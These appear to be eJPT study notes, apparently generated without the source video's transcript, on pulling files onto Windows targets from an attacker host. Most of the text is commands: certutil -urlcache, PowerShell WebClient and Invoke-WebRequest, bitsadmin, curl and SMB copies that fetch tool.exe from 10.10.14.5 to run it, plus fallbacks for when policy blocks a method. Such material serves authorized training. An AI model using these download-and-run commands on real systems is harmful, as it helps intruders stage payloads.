# Transferring Files To Windows Targets — eJPT Study Notes

Note: No transcript was provided. The following summary is inferred conservatively from the filename/context and focuses on standard, built-in Windows-friendly transfer methods used in authorized lab/pentest workflows.

Only use these techniques on systems you own or have explicit written permission to test.

## What the video covers (Introduction / big picture)
- How to move files onto Windows targets during an authorized assessment.
- Using native Windows tooling (PowerShell, certutil, BITS, curl, FTP/TFTP, SMB) to pull files from your attacker host.
- Hosting files from Kali/attack box with simple HTTP/SMB servers.
- Saving to writable locations on Windows and verifying integrity.
- Choosing methods that work across different Windows versions and restricted environments.

## Flow (ordered)
1. Prepare the file on your attacker machine (e.g., tool.exe) and pick a writable target path (e.g., C:\Users\Public\tool.exe).
2. Pick a transfer channel the target allows:
   - HTTP/HTTPS pull (PowerShell, certutil, curl)
   - SMB pull (UNC path to attacker-hosted share)
   - BITS (Start-BitsTransfer or bitsadmin)
   - FTP/TFTP (if services are available)
3. Start the matching server on the attacker side (HTTP or SMB).
4. From the Windows target, run the appropriate native client command to download/copy.
5. Verify the file (size/hash) and run as needed.
6. Clean up: unmap shares, stop servers, remove temporary files.

## Tools highlighted
- Attacker-side:
  - Python 3 HTTP server (python3 -m http.server)
  - Impacket SMB server (impacket-smbserver or smbserver.py)
  - Optional: pyftpdlib for quick FTP
- Windows target:
  - PowerShell: Invoke-WebRequest (iwr), Start-BitsTransfer, WebClient DownloadFile
  - cmd.exe tools: certutil, curl (Win10+), bitsadmin (deprecated but present), ftp, tftp, net use, copy/robocopy
  - Hashing: certutil -hashfile

## Typical command walkthrough (detailed, copy-paste friendly)

Assumptions:
- ATTACKER_IP = 10.10.14.5
- File to transfer = tool.exe
- Target save path = C:\Users\Public\tool.exe

Writable Windows paths to consider:
- C:\Users\Public\
- %TEMP% (echo %TEMP%)
- C:\Windows\Temp\ (often writable, may require admin in some setups)

1) Host an HTTP server (attacker)
```
cd ~/transfer
python3 -m http.server 8000
# Serves files in the current directory at http://10.10.14.5:8000/
```

2) Pull via PowerShell (modern, reliable)
- PowerShell 3+:
```
powershell -NoProfile -Command "Invoke-WebRequest -Uri http://10.10.14.5:8000/tool.exe -OutFile C:\Users\Public\tool.exe"
```
- Compatibility (older PowerShell v2):
```
powershell -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/tool.exe','C:\Users\Public\tool.exe')"
```
- If needed for older hosts (Server 2012/Win7), add:
```
powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing -Uri http://10.10.14.5:8000/tool.exe -OutFile C:\Users\Public\tool.exe"
```

3) Pull via certutil (builtin, very common)
```
certutil -urlcache -f http://10.10.14.5:8000/tool.exe C:\Users\Public\tool.exe
```

4) Pull via curl (Windows 10+)
```
curl http://10.10.14.5:8000/tool.exe -o C:\Users\Public\tool.exe
```

5) Pull via BITS
- PowerShell:
```
powershell -NoProfile -Command "Start-BitsTransfer -Source http://10.10.14.5:8000/tool.exe -Destination C:\Users\Public\tool.exe"
```
- bitsadmin (deprecated but often available):
```
bitsadmin /transfer myJob /download /priority foreground http://10.10.14.5:8000/tool.exe C:\Users\Public\tool.exe
```

6) Host an SMB share (attacker)
- Option A: No-auth share (works best on older hosts; modern Windows may require auth):
```
sudo impacket-smbserver -smb2support SHARE /tmp/share
# Place tool.exe in /tmp/share
```
- Option B: Authenticated share:
```
sudo impacket-smbserver -smb2support -username shareuser -password 'Passw0rd!' SHARE /tmp/share
```

7) Pull via SMB (Windows)
- Map and copy (no-auth share):
```
net use Z: \\10.10.14.5\SHARE
copy Z:\tool.exe C:\Users\Public\tool.exe
net use Z: /delete
```
- Map with credentials:
```
net use Z: \\10.10.14.5\SHARE /user:shareuser Passw0rd!
copy Z:\tool.exe C:\Users\Public\
net use Z: /delete
```
- Or copy directly via UNC without mapping:
```
copy \\10.10.14.5\SHARE\tool.exe C:\Users\Public\tool.exe
```

8) Optional: FTP/TFTP (only if available and permitted)
- Attacker: quick FTP server (requires pyftpdlib installed)
```
python3 -m pip install pyftpdlib --user
python3 -m pyftpdlib -p 21 -w
```
- Windows FTP client:
```
ftp -A 10.10.14.5
binary
get tool.exe C:\Users\Public\tool.exe
bye
```
- Windows TFTP client (if feature enabled) — uses binary mode with -i:
```
tftp -i 10.10.14.5 GET tool.exe C:\Users\Public\tool.exe
```

9) Verify and clean up
- Check file exists and size:
```
dir C:\Users\Public\tool.exe
```
- Hash for integrity:
```
certutil -hashfile C:\Users\Public\tool.exe SHA256
```
- Stop servers / unmap shares:
```
# On Windows
net use Z: /delete

# On attacker (Ctrl+C to stop http.server or SMB server)
```

## Practical tips
- Prefer pull methods from the Windows host; many environments block unsolicited inbound connections.
- Common save locations: C:\Users\Public\, %TEMP%, or the current user’s profile. Avoid writing to system-protected directories unless required.
- PowerShell Invoke-WebRequest is widely available; add -UseBasicParsing on older hosts.
- certutil is present on most Windows versions and works even when PowerShell is restricted.
- If SMB fails unauthenticated, run an authenticated Impacket SMB server and map with net use using provided credentials.
- Quote paths with spaces.
- Use absolute paths; relative paths can resolve unexpectedly in services/scheduled tasks.
- Verify with certutil -hashfile to ensure the file is intact before execution.
- If a method is blocked by policy, try an alternative (HTTP → SMB → BITS → curl → FTP/TFTP).
- Keep ports simple (80/8000 for HTTP) to minimize firewall issues; ensure the chosen port is reachable from the target.

## Minimal cheat sheet (one-screen flow)

- Attacker: HTTP
```
cd ~/transfer && python3 -m http.server 8000
```
- Windows (PowerShell modern):
```
powershell -NoProfile -Command "Invoke-WebRequest -Uri http://10.10.14.5:8000/tool.exe -OutFile C:\Users\Public\tool.exe"
```
- Windows (PowerShell v2 fallback):
```
powershell -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/tool.exe','C:\Users\Public\tool.exe')"
```
- Windows (certutil):
```
certutil -urlcache -f http://10.10.14.5:8000/tool.exe C:\Users\Public\tool.exe
```
- Attacker: SMB
```
sudo impacket-smbserver -smb2support SHARE /tmp/share
```
- Windows (SMB copy):
```
net use Z: \\10.10.14.5\SHARE
copy Z:\tool.exe C:\Users\Public\tool.exe
net use Z: /delete
```
- Verify hash:
```
certutil -hashfile C:\Users\Public\tool.exe SHA256
```

## Summary
This module covers reliable, native-friendly ways to transfer files onto Windows targets in an authorized lab/pentest: host content via HTTP or SMB on the attacker box, then use built-in Windows clients (PowerShell Invoke-WebRequest/WebClient, certutil, Start-BitsTransfer, curl, SMB copy) to pull the file into a writable location. If one method is blocked, switch to another. Always verify integrity and clean up shares/servers afterward.